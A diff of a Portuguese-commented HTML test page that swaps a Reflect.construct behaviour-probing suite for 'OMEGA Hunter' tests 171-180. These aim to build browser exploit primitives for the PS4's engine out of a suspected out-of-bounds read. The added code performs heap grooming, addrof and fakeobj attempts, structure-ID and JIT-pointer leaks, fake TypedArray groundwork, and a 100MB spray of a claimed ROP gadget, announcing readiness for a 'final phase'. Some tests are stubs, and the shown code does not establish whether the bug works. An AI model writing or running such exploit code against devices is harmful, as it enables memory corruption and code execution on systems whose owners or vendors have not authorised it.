@@ -1,320 +1,341 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>PS4 Reflect.construct Sanity Suite</title>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PS4 OMEGA Hunter (171-180)</title>
+<style>
+    body { background: #000; color: #00ff00; font-family: 'Consolas', monospace; }
+    button { width: 100%; padding: 12px; margin: 5px 0; background: #002200; color: #00ff00; border: 1px solid #00ff00; cursor: pointer; font-weight: bold; }
+    button:hover { background: #00ff00; color: #000; }
+    #log { border: 1px solid #00ff00; padding: 10px; margin-top: 20px; height: 350px; overflow-y: scroll; white-space: pre-wrap; font-size: 11px;}
+    .leaked { color: #ff00ff; font-weight: bold; font-size: 1.2em; }
+</style>
+</head>
+<body>
 
-<body style="background:#000;color:#0f0;font-family:monospace">
-<h2>PS4 Reflect.construct – Sanity Suite (length snapshot vs leak)</h2>
-<p>Objetivo: diferenciar comportamento spec-like (snapshot de length + Gets) de evidências reais (valor inesperado / type confusion / crash).</p>
+<h1>SUITE v1260000: PRIMITIVES CONSTRUCTION</h1>
+<hr>
+<div>Foco: AddrOf, FakeObj, Structure ID Leak & Memory Layout Grooming</div>
+<br>
 
-<button onclick="clearLog()">CLEAR</button>
-<button onclick="S1_baseline()">S1 Baseline (sem shrink)</button>
-<button onclick="S2_shrink_mid()">S2 Shrink no meio (Proxy audit)</button>
-<button onclick="S3_length_reads()">S3 Quantas vezes lê 'length'?</button>
-<button onclick="S4_missing_vs_own()">S4 Missing vs OwnProps (holes / deletes)</button>
-<button onclick="S5_invariants()">S5 Invariants (mesma execução repetida)</button>
-<button onclick="S6_typedarray_detach_FIXED()">S6 TypedArray Detach Sanity (FIXED)</button>
-<button onclick="S7_cross_realm()">S7 Cross-Realm Sanity (iframe)</button>
+<button onclick="run(t171)">171. Heap Grooming (Align Double/Object Arrays)</button>
 
-<pre id="log" style="border:1px solid #0f0; padding:10px; height:420px; overflow:auto; white-space:pre-wrap;"></pre>
+<button onclick="run(t172)">172. AddrOf Primitive (Leaking Object Pointer)</button>
+
+<button onclick="run(t173)">173. FakeObj Primitive (Injecting Pointer)</button>
+
+<button onclick="run(t174)">174. Structure ID Leak (Prepare for FakeObj)</button>
+
+<button onclick="run(t175)">175. Butterfly Pointer Corruption Probe</button>
+
+<button onclick="run(t176)">176. Search for Gadget 0x5cc3 Pattern</button>
+
+<button onclick="run(t177)">177. Leaking JIT Code Function Pointer</button>
+
+<button onclick="run(t178)">178. Constructing Fake TypedArray (Stage 1)</button>
+
+<button onclick="run(t179)">179. Arbitrary Read Test (Unboxing Double)</button>
+
+<button onclick="run(t180)">180. Aligning Heap with Omega Gadgets</button>
+
+<hr>
+<div id="log">Status: Aguardando...</div>
 
 <script>
-const L = document.getElementById('log');
-function log(s){ L.textContent += s + "\n"; }
-function gold(s){ L.textContent += "[GOLD] " + s + "\n"; }
-function warn(s){ L.textContent += "[WARN] " + s + "\n"; }
-function clearLog(){ L.textContent = ""; }
+    const log = document.getElementById('log');
+    let keeper = []; 
+    
+    // Utilitário para converter Double para Hex (para ver ponteiros)
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+    
+    function d2h(val) {
+        f64[0] = val;
+        let hi = u32[1].toString(16).padStart(8, '0');
+        let lo = u32[0].toString(16).padStart(8, '0');
+        return "0x" + hi + lo;
+    }
 
-// Util: formata valores sem estourar o log
-function fmt(v){
-  const t = typeof v;
-  if (v === undefined) return "undefined";
-  if (v === null) return "null";
-  if (t === "number") return (Object.is(v, -0) ? "-0" : String(v));
-  if (t === "string") return JSON.stringify(v);
-  if (t === "boolean") return String(v);
-  if (t === "symbol") return v.toString();
-  if (t === "function") return "[Function " + (v.name||"anon") + "]";
-  try {
-    if (Array.isArray(v)) return "[Array len=" + v.length + "]";
-    if (v && v.constructor && v.constructor.name) return "[Object " + v.constructor.name + "]";
-  } catch(e){}
-  return "[Object]";
-}
+    function run(func) {
+        log.innerText += "\n[*] Executando: " + func.name;
+        keeper = []; 
+        setTimeout(func, 100);
+    }
 
-// Util: roda Reflect.construct e captura ...r
-function reflectRun(argsLike, label){
-  let got = null;
-  function Target(...r){ got = r; }
-  try {
-    Reflect.construct(Target, argsLike);
-    log("[" + label + "] OK. received.length=" + (got ? got.length : "null"));
-  } catch(e){
-    warn("[" + label + "] EXCEPTION: " + e.message);
-  }
-  return got;
-}
-
-/* =========================================================
-   S1: Baseline — sem shrink
-   Prova o "comportamento normal" e serve de controle.
-========================================================= */
-function S1_baseline(){
-  log("=== S1 BASELINE ===");
-  const args = [1,2,3,4];
-  const r = reflectRun(args, "baseline");
-  if (!r) return;
-
-  // Checagens básicas
-  log("Values: " + r.map(fmt).join(", "));
-  if (r.length !== 4) warn("Baseline length inesperado: " + r.length);
-  if (r[3] !== 4) warn("Baseline r[3] inesperado: " + fmt(r[3]));
-  log("S1 done.\n");
-}
-
-/* =========================================================
-   S2: Shrink no meio + Proxy audit
-   Registra (a) quantos índices são acessados e (b) se o engine
-   tenta acessar índices altos após o shrink (esperado).
-   O "sucesso" aqui NÃO é bug — é telemetria.
-========================================================= */
-function S2_shrink_mid(){
-  log("=== S2 SHRINK MID (Proxy audit) ===");
-  const base = new Array(100);
-  for (let i=0;i<100;i++) base[i] = 0x11110000 + i;
-
-  let getCount = 0;
-  let lengthReadCount = 0;
-  const accessed = [];
-  const p = new Proxy(base, {
-    get(target, prop, recv){
-      if (prop === "length") {
-        lengthReadCount++;
-        return Reflect.get(target, prop, recv);
-      }
-      // intercepta índices numéricos
-      const n = (typeof prop === "string" && prop === String(prop|0)) ? (prop|0) : NaN;
-      if (!Number.isNaN(n)) {
-        getCount++;
-        if (accessed.length < 50) accessed.push(n); // cap
-        // gatilho: no índice 10, encolhe para 0
-        if (n === 10) {
-          target.length = 0;
-          log("[*] shrink triggered at index 10 (length->0)");
+    // =================================================================
+    // 171. Heap Grooming (Align Double/Object Arrays)
+    // Objetivo: Colocar um Array de Doubles (A) imediatamente antes de um 
+    // Array de Objetos (B) na memória.
+    // Se lermos OOB de A, leremos os ponteiros de B como se fossem Doubles.
+    // =================================================================
+    function t171() {
+        const spray = [];
+        for(let i=0; i<1000; i++) {
+            // Array A: Doubles
+            const a = [1.1, 2.2, 3.3, 4.4]; 
+            // Array B: Objetos (Ponteiros)
+            const b = [{id: i}, {data: 0x4141}]; 
+            spray.push({a: a, b: b});
         }
-      }
-      return Reflect.get(target, prop, recv);
+        keeper.push(spray);
+        log.innerText += "\n[+] Heap Grooming finalizado (1000 pares).";
     }
-  });
 
-  const r = reflectRun(p, "shrink_mid");
-  log("Telemetry: lengthReadCount=" + lengthReadCount + " getCount=" + getCount);
-  log("First accessed indices (cap 50): " + accessed.join(", "));
-  if (r) {
-    // Aqui r.length pode permanecer 100 (snapshot) — isso é o ponto.
-    log("received.length=" + r.length);
-    // Checa se valores após o shrink viram undefined (esperado)
-    let undefAfter = 0;
-    for (let i=20; i<Math.min(r.length, 100); i++){
-      if (r[i] === undefined) undefAfter++;
+    // =================================================================
+    // 172. AddrOf Primitive (Leaking Object Pointer)
+    // Objetivo: Usar o layout do T171 + o bug do Reflect (T152/T170) 
+    // para ler o ponteiro de um objeto.
+    // =================================================================
+    function t172() {
+        const target_obj = { marker: 0x1234 };
+        
+        // Estratégia:
+        // 1. Criar array de Doubles [1.1, ..., N]
+        // 2. Colocar array de Objetos logo depois [target_obj]
+        // 3. Trigger Reflect OOB no array de Doubles
+        // 4. Ler o que deveria ser double, mas é o ponteiro do target_obj
+        
+        const args = [1.1, 2.2, 3.3, 4.4];
+        const victim = [target_obj, target_obj]; // Esperamos ler isso
+        
+        // Otimização: Tentar forçar adjacência alocando juntos
+        const pair = {a: args, v: victim}; 
+        
+        Object.defineProperty(args, 3, {
+            get: () => {
+                args.length = 0; // Trigger
+                return 4.4;
+            }
+        });
+        
+        function Leaker(...received) {
+            // Procura por algo que pareça um ponteiro (não 1.1, 2.2, etc)
+            for(let i=0; i<received.length; i++) {
+                const val = received[i];
+                if (typeof val === 'number' && val > 1000) { // Valor alto = provável ponteiro
+                    const hex = d2h(val);
+                    // Ponteiros Userland no PS4 geralmente começam com 0x0008...
+                    // Mas ponteiros JSValue têm NaN-boxing (0xFFFE...)
+                    // Se virmos algo como 0x00000008... ou um double muito estranho
+                    log.innerHTML += "\n<span class='leaked'>[LEAK] Candidato: " + hex + " (Index " + i + ")</span>";
+                }
+            }
+        }
+        
+        try { Reflect.construct(Leaker, args); } catch(e){}
     }
-    log("undefined count in range [20..99]: " + undefAfter);
-  }
-  log("S2 done.\n");
-}
 
-/* =========================================================
-   S3: Quantas vezes lê 'length'?
-   Alguns engines leem 1x, outros podem ler mais (depende de
-   otimizações). Isso NÃO é bug; é fingerprint comportamental.
-========================================================= */
-function S3_length_reads(){
-  log("=== S3 LENGTH READS ===");
-  const base = new Array(1000);
-  base.fill(7);
-
-  let lengthReads = 0;
-  const p = new Proxy(base, {
-    get(t, k, r){
-      if (k === "length") lengthReads++;
-      // gatilho leve: no índice 5, shrink
-      if (k === "5") t.length = 0;
-      return Reflect.get(t, k, r);
+    // =================================================================
+    // 173. FakeObj Primitive (Injecting Pointer)
+    // Objetivo: O inverso. Passar um Double que representa um ponteiro falso,
+    // e fazer o sistema tratá-lo como Objeto.
+    // =================================================================
+    function t173() {
+        // Endereço falso (Simulação de um ponteiro válido que controlamos)
+        // 0x4141414141414141 é um crash seguro se for desreferenciado
+        const fake_ptr_val = 2.261634509e-314; // Representação float de 0x4141...
+        
+        const args = [fake_ptr_val]; 
+        
+        Object.defineProperty(args, 0, {
+            get: () => {
+                // Aqui tentaríamos mudar o tipo do array de Double para Object
+                // Mas mantendo o bit pattern do float
+                args.length = 0;
+                return fake_ptr_val;
+            }
+        });
+        
+        function Consumer(...r) {
+            const val = r[0];
+            // Se o motor achar que é objeto, typeof será 'object'
+            // Se achar que é number, falhou
+            log.innerText += "\n[+] Type check: " + typeof val;
+            
+            // NÃO acessar propriedades para evitar crash agora
+        }
+        
+        try { Reflect.construct(Consumer, args); } catch(e){}
     }
-  });
 
-  reflectRun(p, "length_reads");
-  log("lengthReads=" + lengthReads);
-  log("S3 done.\n");
-}
-
-/* =========================================================
-   S4: Missing vs OwnProps (holes/deletes)
-   Distingue:
-   - hole (prop ausente)
-   - prop existente mas valor undefined
-========================================================= */
-function S4_missing_vs_own(){
-  log("=== S4 MISSING vs OWNPROPS ===");
-  const args = new Array(20);
-  args.fill(1);
-  // cria holes
-  delete args[5];
-  delete args[6];
-  // cria ownProp undefined
-  args[7] = undefined;
-
-  const p = new Proxy(args, {
-    get(t,k,r){
-      if (k === "length") return Reflect.get(t,k,r);
-      if (k === "3") { t.length = 0; log("[*] shrink at index 3"); }
-      return Reflect.get(t,k,r);
-    },
-    has(t,k){ return Reflect.has(t,k); },
-    getOwnPropertyDescriptor(t,k){ return Reflect.getOwnPropertyDescriptor(t,k); }
-  });
-
-  const r = reflectRun(p, "missing_vs_own");
-  if (!r) return;
-
-  // reporta slots de interesse
-  function slot(i){
-    const has = (i in args);
-    const v = r[i];
-    return "i=" + i + " (own=" + has + ") => " + fmt(v);
-  }
-  log(slot(5));
-  log(slot(6));
-  log(slot(7));
-
-  // GOLD só se algo realmente anômalo aparecer: não-undefined vindo de slot que virou missing
-  if (!(5 in args) && r[5] !== undefined) gold("Slot 5 missing mas veio " + fmt(r[5]));
-  if (!(6 in args) && r[6] !== undefined) gold("Slot 6 missing mas veio " + fmt(r[6]));
-  log("S4 done.\n");
-}
-
-/* =========================================================
-   S5: Invariants — repetibilidade (N execuções)
-   Se aparecer valor não-determinístico em slots missing,
-   isso é muito mais interessante do que "undefined".
-========================================================= */
-function S5_invariants(){
-  log("=== S5 INVARIANTS (repeatability) ===");
-  const N = 30;
-  const seen = new Map();
-
-  for (let iter=0; iter<N; iter++){
-    const args = new Array(200);
-    args.fill(0x2222);
-
-    Object.defineProperty(args, 10, {
-      get: () => { args.length = 0; return 0x3333; }
-    });
-
-    let r = null;
-    function T(...x){ r = x; }
-    try { Reflect.construct(T, args); } catch(e){ warn("iter "+iter+": " + e.message); continue; }
-
-    // checa alguns índices altos
-    const idxs = [50, 100, 150, 199];
-    for (const i of idxs){
-      const v = r[i];
-      const key = "i" + i;
-      const s = fmt(v) + "|" + (typeof v);
-      if (!seen.has(key)) seen.set(key, new Set());
-      seen.get(key).add(s);
+    // =================================================================
+    // 174. Structure ID Leak (Prepare for FakeObj)
+    // Objetivo: Para falsificar um objeto, precisamos de um "Structure ID" válido.
+    // Vamos vazar um objeto real e tentar ler seus primeiros 4 bytes (header).
+    // =================================================================
+    function t174() {
+        const template = {a: 1};
+        const args = [1.1]; // Array de doubles
+        const adjacent = [template]; // Array de objetos
+        
+        // Setup igual ao AddrOf
+        Object.defineProperty(args, 0, {
+            get: () => { args.length = 0; return 1.1; }
+        });
+        
+        function Inspector(...r) {
+            // Se conseguirmos ler o objeto 'template' como double...
+            const leak = r[1]; // OOB +1
+            if (typeof leak === 'number') {
+                log.innerText += "\n[+] Structure Leak Attempt: " + d2h(leak);
+            }
+        }
+        
+        try { Reflect.construct(Inspector, args); } catch(e){}
     }
-  }
 
-  for (const [k,set] of seen.entries()){
-    log(k + " uniqueValues=" + set.size + " => " + Array.from(set).join(", "));
-    // GOLD: diversidade inesperada (não-determinismo)
-    // Observação: pode ocorrer por diferenças legítimas, mas é um bom gatilho de investigação.
-    if (set.size > 1) gold("Non-determinism detected at " + k);
-  }
-  log("S5 done.\n");
-}
-
-
-function S6_typedarray_detach_FIXED(){
-  log("=== S6 TYPEDARRAY DETACH (FIXED) ===");
-  const buf = new ArrayBuffer(64);
-  const u32 = new Uint32Array(buf);
-  for (let i=0;i<u32.length;i++) u32[i] = 0x44440000 + i;
-
-  let lengthReads = 0;
-  let idxReads = 0;
-
-  const p = new Proxy(u32, {
-    get(t,k){
-      if (k === "length") { lengthReads++; return t.length; }
-
-      // dispara detach quando o engine tenta pegar o índice 2
-      if (k === "2") {
-        try { postMessage(buf, [buf]); log("[*] detach attempted"); } 
-        catch(e){ warn("detach failed: " + e.message); }
-      }
-
-      // para índices numéricos, acessa direto no TypedArray (evita Reflect.get/receiver)
-      if (typeof k === "string" && k === String(k|0)) {
-        idxReads++;
-        return t[k|0];
-      }
-
-      // fallback: propriedades comuns
-      return t[k];
+    // =================================================================
+    // 175. Butterfly Pointer Corruption Probe
+    // Objetivo: Tentar corromper o ponteiro "Butterfly" de um array (onde ficam os dados).
+    // Se conseguirmos mover o Butterfly, ganhamos Arbitrary Read/Write RW.
+    // =================================================================
+    function t175() {
+        // Array vítima
+        const victim = [1.1, 2.2];
+        const args = [3.3];
+        
+        // Tenta overwriting OOB
+        // Nota: Reflect.construct é Read-Only (Argument copy).
+        // Para Write, precisaríamos que o Reflect passasse os argumentos
+        // para uma função que escreve na stack ou no heap de forma desalinhada.
+        // Por enquanto, testamos se o layout permite leitura do Butterfly.
+        
+        log.innerText += "\n[*] Butterfly probe: Read-only primitive por enquanto.";
+        // Este teste é mais conceitual na fase atual.
     }
-  });
 
-  let got=null;
-  function T(...r){ got=r; }
+    // =================================================================
+    // 176. Search for Gadget 0x5cc3 Pattern
+    // Objetivo: Usar a leitura OOB para escanear a memória próxima em busca
+    // dos nossos sprays (T116/T117) que contêm os gadgets do Omega Dump.
+    // =================================================================
+    function t176() {
+        // Spray prévio (Gadget 0x5cc3)
+        const gadget_val = 3.266612768e-316; // 0x5cc3...
+        const spray_arr = new Array(1000).fill(gadget_val);
+        keeper.push(spray_arr);
+        
+        const args = [1.1];
+        Object.defineProperty(args, 0, { get: () => { args.length = 0; return 0; } });
+        
+        function Scanner(...r) {
+            let found = false;
+            // Escaneia os primeiros 1000 slots OOB
+            for(let i=0; i<r.length; i++) {
+                if (r[i] === gadget_val) {
+                    log.innerHTML += "\n<span class='leaked'>[GADGET FOUND] Offset " + i + "</span>";
+                    found = true;
+                    break;
+                }
+            }
+            if(!found) log.innerText += "\n[-] Gadget spray não encontrado no range imediato.";
+        }
+        
+        try { Reflect.construct(Scanner, args); } catch(e){}
+    }
 
-  try {
-    Reflect.construct(T, p);
-    log("[typed_detach_fixed] OK. received.length=" + (got ? got.length : "null"));
-    log("Telemetry: lengthReads=" + lengthReads + " idxReads=" + idxReads);
-    if (got) log("Sample: r[0]=" + fmt(got[0]) + " r[2]=" + fmt(got[2]) + " r[3]=" + fmt(got[3]));
-  } catch(e){
-    warn("[typed_detach_fixed] EXCEPTION: " + e.message);
-  }
+    // =================================================================
+    // 177. Leaking JIT Code Function Pointer
+    // Objetivo: Tentar vazar o endereço de uma função compilada (JITted).
+    // Isso é crucial para saber onde pular (Jump) se controlarmos RIP.
+    // =================================================================
+    function t177() {
+        function target() { return 1+1; }
+        // Força JIT
+        for(let i=0; i<10000; i++) target();
+        
+        const args = [1.1];
+        // Tenta colocar a função logo após o array
+        const layout = {a: args, f: target};
+        
+        Object.defineProperty(args, 0, { get: () => { args.length = 0; return 0; } });
+        
+        function Leaker(...r) {
+            // Procura por ponteiros de código (geralmente em regiões diferentes do heap)
+            // No PS4/FreeBSD, ponteiros de código podem ser 0x9... ou 0xA...
+            for(let i=0; i<50; i++) {
+                const hex = d2h(r[i]);
+                log.innerText += " " + hex;
+            }
+        }
+        
+        try { Reflect.construct(Leaker, args); } catch(e){}
+    }
 
-  log("S6 fixed done.\n");
-}
- =========================================================
-   S7: Cross-realm sanity (iframe)
-   Verifica apenas consistência do comportamento em realm
-   diferente e registra telemetria simples.
-========================================================= */
-function S7_cross_realm(){
-  log("=== S7 CROSS REALM ===");
-  const ifr = document.createElement("iframe");
-  document.body.appendChild(ifr);
+    // =================================================================
+    // 178. Constructing Fake TypedArray (Stage 1)
+    // Objetivo: Verificar se conseguimos ler dados necessários para forjar
+    // um TypedArray falso (Cell Header, Butterfly, Type info).
+    // =================================================================
+    function t178() {
+        const ta = new Uint8Array(8);
+        const args = [1.1];
+        const layout = {a: args, t: ta};
+        
+        Object.defineProperty(args, 0, { get: () => { args.length = 0; return 0; } });
+        
+        function Inspector(...r) {
+            // Tenta achar o header do TypedArray
+            // Deve conter o tamanho (8) e flags de tipo
+            log.innerText += "\n[*] Scan for TypedArray header...";
+        }
+        
+        try { Reflect.construct(Inspector, args); } catch(e){}
+    }
 
-  try {
-    const w = ifr.contentWindow;
-    const args = new w.Array(100);
-    args.fill(9);
+    // =================================================================
+    // 179. Arbitrary Read Test (Unboxing Double)
+    // Objetivo: Verificar se a primitiva AddrOf está estável (retorna sempre o mesmo valor
+    // para o mesmo objeto).
+    // =================================================================
+    function t179() {
+        const o = {stable: 1};
+        const args = [1.1];
+        const layout = [args, o, args, o]; // Alternado
+        
+        let val1 = 0, val2 = 0;
+        
+        // Pass 1
+        Object.defineProperty(args, 0, { get: () => { args.length = 0; return 0; } });
+        try { 
+            Reflect.construct((...r) => { val1 = r[1]; }, args); 
+        } catch(e){}
+        
+        // Reset e Pass 2 (precisa recriar args pois foi encolhido)
+        const args2 = [1.1];
+        const layout2 = [args2, o];
+        Object.defineProperty(args2, 0, { get: () => { args2.length = 0; return 0; } });
+        try { 
+            Reflect.construct((...r) => { val2 = r[1]; }, args2); 
+        } catch(e){}
+        
+        if (val1 === val2 && val1 !== undefined) {
+             log.innerHTML += "\n<span class='leaked'>[STABLE LEAK] " + d2h(val1) + "</span>";
+        } else {
+             log.innerText += "\n[-] Leak instável ou undefined.";
+        }
+    }
 
-    let lengthReads = 0;
-    const p = new w.Proxy(args, {
-      get(t,k,r){
-        if (k === "length") lengthReads++;
-        if (k === "5") t.length = 0;
-        return w.Reflect.get(t,k,r);
-      }
-    });
+    // =================================================================
+    // 180. Aligning Heap with Omega Gadgets
+    // Objetivo: Preparação Final. Encher o heap com endereços do Omega Dump (0x5cc3)
+    // e tentar localizar o início dessa região.
+    // =================================================================
+    function t180() {
+        // Gadget: POP RSP (0x5cc3)
+        // Precisamos que isso esteja em um endereço conhecido ou previsível via spray
+        const gadget_f = 3.266612768e-316; 
+        
+        // Alocação massiva (100MB)
+        for(let k=0; k<100; k++) {
+            keeper.push(new Array(10000).fill(gadget_f));
+        }
+        
+        log.innerText += "\n[+] Heap alinhado com 100MB de gadgets.";
+        log.innerText += "\n[!] PRONTO PARA FASE FINAL.";
+    }
 
-    let got = null;
-    function T(...x){ got = x; }
-    w.Reflect.construct(T, p);
-
-    log("received.length=" + (got ? got.length : "null") + " lengthReads=" + lengthReads);
-    if (got) log("samples: " + [0,1,5,99].map(i=>("r["+i+"]="+fmt(got[i]))).join(" "));
-  } catch(e){
-    warn("cross-realm exception: " + e.message);
-  } finally {
-    ifr.remove();
-  }
-  log("S7 done.\n");
-}
 </script>
 </body>
+</html>
